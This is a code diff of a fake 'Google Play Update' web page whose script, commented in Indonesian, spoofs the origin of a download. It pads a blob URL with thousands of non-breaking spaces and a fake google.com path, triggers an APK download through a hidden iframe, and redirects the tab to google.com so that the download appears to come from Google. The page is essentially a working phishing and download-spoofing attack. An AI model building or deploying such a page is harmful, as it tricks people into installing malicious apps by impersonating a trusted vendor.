@@ -3,46 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Services</title>
+    <title>Google Update</title>
 </head>
 <body style="background:#f1f3f4; font-family:sans-serif; text-align:center; padding-top:100px;">
 
-    <div style="padding:30px; background:#fff; border-radius:8px; display:inline-block; box-shadow:0 2px 10px rgba(0,0,0,0.1); max-width:300px;">
-        <h2 style="color:#1a73e8;">Google Play Update</h2>
-        <p style="font-size:14px; color:#5f6368;">Update required to continue using Google services.</p>
-        <button id="pwnBtn" style="padding:12px 25px; background:#1a73e8; color:#fff; border:none; border-radius:4px; cursor:pointer; width:100%;">INSTALL NOW</button>
+    <div style="padding:40px; background:#fff; border-radius:12px; display:inline-block; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+        <h2 style="color:#1a73e8; margin-top:0;">Google Play</h2>
+        <p>A critical security patch is ready.</p>
+        <button id="pwnBtn" style="padding:15px 30px; background:#1a73e8; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:bold;">INSTALL NOW</button>
     </div>
 
 <script>
     document.getElementById('pwnBtn').addEventListener('click', function() {
-        const filename = "GooglePatch.apk";
         const spoofDomain = "www.google.com";
+        const filename = "Google_Update.apk";
         
-        // 1. Karakter Spoofing
+        // Karakter khusus untuk mengecoh parser Chrome
         const nbSpace = decodeURIComponent("%C2%A0");
-        const padding = nbSpace.repeat(2000); 
-        const fakeOrigin = `https://${spoofDomain}/security/v2026/`;
+        const padding = nbSpace.repeat(3000); 
+        const fakeUrl = `https://${spoofDomain}/update/system-patch-v105/`;
 
-        // 2. Buat Blob Payload (APK palsu)
+        // 1. Buat Payload APK
         const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); 
         const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
         const blobUrl = URL.createObjectURL(blob);
+        const finalPayload = blobUrl + "#" + padding + fakeUrl;
 
-        // 3. Eksekusi menggunakan Anchor tersembunyi
-        // Menggunakan target="_blank" terkadang membantu memisahkan context origin di Chrome
-        const a = document.createElement('a');
-        a.href = blobUrl + "#" + padding + fakeOrigin;
-        a.download = filename;
-        
-        document.body.appendChild(a);
-        a.click();
-        
-        // 4. Manipulasi Address Bar
-        // Segera ganti lokasi agar saat dialog muncul, Chrome sedang memproses URL Google
+        // 2. TEKNIK IFRAME: Buat iframe transparan untuk memicu download
+        // Ini seringkali membingungkan "Origin Tracker" pada Chrome Android
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+
+        // 3. Eksekusi Download di dalam context Iframe
+        iframe.src = finalPayload;
+
+        // 4. Sinkronisasi Address Bar
+        // Kita paksa tab utama berpindah ke Google saat dialog download sedang dipersiapkan
+        window.location.replace("https://www.google.com/android/update");
+
+        // Cleanup
         setTimeout(() => {
-            window.location.replace("https://www.google.com/");
-            document.body.removeChild(a);
-        }, 3000);
+            URL.revokeObjectURL(blobUrl);
+            document.body.removeChild(iframe);
+        }, 2000);
     });
 </script>
 </body>
